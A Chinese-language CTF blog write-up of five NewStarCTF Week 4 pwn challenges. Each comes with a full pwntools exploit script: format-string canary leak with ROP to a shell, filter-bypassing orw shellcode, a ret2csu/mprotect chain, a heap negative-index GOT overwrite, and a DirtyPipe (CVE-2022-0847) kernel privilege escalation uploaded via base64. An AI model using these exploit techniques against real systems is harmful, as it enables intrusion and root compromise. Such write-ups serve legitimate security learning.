---
title: NewStarCTF Week4 PWN WP
index_img: img/article/newstarctf/image-20221017112826465.png
excerpt: 由于知道这个比赛比较晚，正式参与比赛是第四周的周三晚上，还差一道堆🐎，没有完成AK(但是拿了四个一血也好爽)。最后一题未解主要原因确实是自己在_IO_File相关利用了解不足，赛后找夜悠师傅拿到了exp，真的好感谢🌹
---

## 前言

> 由于知道这个比赛比较晚，正式参与比赛是第四周的周三晚上，还差一道堆🐎，没有完成AK(但是拿了四个一血也好爽)。最后一题未解主要原因确实是自己在_IO_File相关利用了解不足，赛后找夜悠师傅拿到了exp，真的好感谢🌹

![战绩截图](img/article/newstarctf/image-20221017112826465.png)



## Canary

比较简单的一道题，等我开始做题的时候已经有4个解了

### exp

```python
from pwn import *

io = process('./pwn')
# io = remote('node4.buuoj.cn',26078)
context.log_level = 'debug'
# pause()
io.recvuntil('Now answer me, will you v me 50')
io.sendline('%11$p%9$p')
io.recvline()
canary = int(io.recv(18),16)
code_base = int(io.recv(14),16) - 0x840 
success("canary -->"+hex(canary))
success("code_base-->"+hex(code_base))

money = code_base + 0x20206c
payload =  b'%99c%7$n' + p64(money)
pause()
io.recvuntil('What do you want to say to the canary')
io.sendline(payload)
io.recvline()
binsh = code_base + 0x202020
pop_rdi = code_base+0x0000000000000b33 #: pop rdi ; ret
syscall = code_base + 0x9dc
payload = b'a'*0x28 + p64(canary) + b'a'*0x8 + p64(pop_rdi) + p64(binsh) + p64(syscall)
io.sendline(payload)

io.interactive()
```



## OhMyShellcode

一道orw的shellcode题目，题目专门开了一个空间用于放置orw，也比较简单。关键在于第一次读入有个判断，会拦住`\x0f`，但是检测长度并不完全。

### exp

```python
from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn',25430)
context.arch = 'amd64'
# context.log_level = 'debug'

backdoor = 0x233000

io.recvuntil('Show me your magic.')
read = '''mov rsi,0x23301e
mov rax , 0
mov rax , 0
mov rax , 0
syscall
'''
sh = asm(read)
sh2 =asm(shellcraft.open('./flag'))
sh2+=asm(shellcraft.read(3,backdoor+0x100,0x100))
sh2+=asm(shellcraft.write(1,backdoor+0x100,0x100))

io.send(sh)
pause()
io.recvuntil('Good luck!')
payload = b'a'*0x38 + p64(backdoor)
io.sendline(payload)
raw_input()
io.sendline(sh2)
io.interactive()
```



## ret2csu2

做这道题的时候并没有去看第三周的ret2csu，夜悠师傅的评价是这样的，不得不说这个题的gadget还是很漂亮的。

![会玩就行](img/article/newstarctf/image-20221017121338219.png)

第一次payload要改rbp到bss段，同时跳转回`sys_read`，实现对bss写入`ret2csu`的rop调用`mprotect`，以及shellcode布置。

### exp

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn',29895)
context.arch = 'amd64'
context.log_level = 'debug'
csu_end_addr = 0x40075a
csu_front_addr = 0x400740

mprotect = 0x40067b
mprotect_plt = 0x600fe8
bss = 0x601110
bss1 = 0x601020
leave_ret =0x400681
def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sc = asm(shellcraft.sh())
    payload +=sc
    payload += b'b' *0x40
    payload += p64(bss1-0x8)
    payload += p64(leave_ret)
    io.send(payload)
    # sleep(1)
pause()
io.recvuntil('check it!')
payload = b'a'*0xf0+p64(bss)+p64(0x4006e7)
io.send(payload)
sleep(1)

csu(0,1,mprotect_plt,0x601000,0x1000,0x7,0x6010a0)

io.interactive()ma
```



## 这是堆🐴

这道题由于heap角标检测可以为负，利用一个指向自己的指针实现任意地址写，随后劫持got为one_gadget即可

### exp

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn',28432)
# context.log_level = 'debug'

libc = ELF('./libc-2.31.so')
heap = 0x6020e0
puts = 0x602018 #-25

def show(idx):
    io.recvuntil(">>")
    io.sendline('4')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    
def edit(idx,text):
    io.recvuntil(">>")
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Content:')
    io.sendline(text)

edit(-12,p64(0x602038))    
show(-12)

# io.recvunti('Content:')
puts = u64(io.recv(6).ljust(8,b'\x00'))
libc_base = puts - libc.symbols['printf']
pause()
success("puts_addr-->"+hex(puts))
success("libc_base-->"+hex(libc_base))

one_gadget = libc_base + 0xe3b01
edit(-12,p64(one_gadget))
io.interactive()
```



## KMario

一道kernel题目，利用CVE-2022-0847实现本地提权。关键在于远端没有gcc，所以只能本地编译好。先把elf转为base64，随后在远端转回elf文件即可。

> POC链接：[CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
>
> 不过我自己做的时候似乎由于elf文件太大，一直传不上去，看了夜悠师傅的exp才发现压缩一下就好，我真是个铸币

### exp

```python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp2 > ./exp.gz')
    r.sendlineafter(cmd, 'cd /tmp')
    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
    r.sendlineafter(cmd, 'gunzip ./exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./exp')
    r.sendlineafter(cmd, './exp /pwnmeplz')
    r.interactive()


p = remote('node4.buuoj.cn',25457)
# p = process('./start.sh')
exploit(p)
```

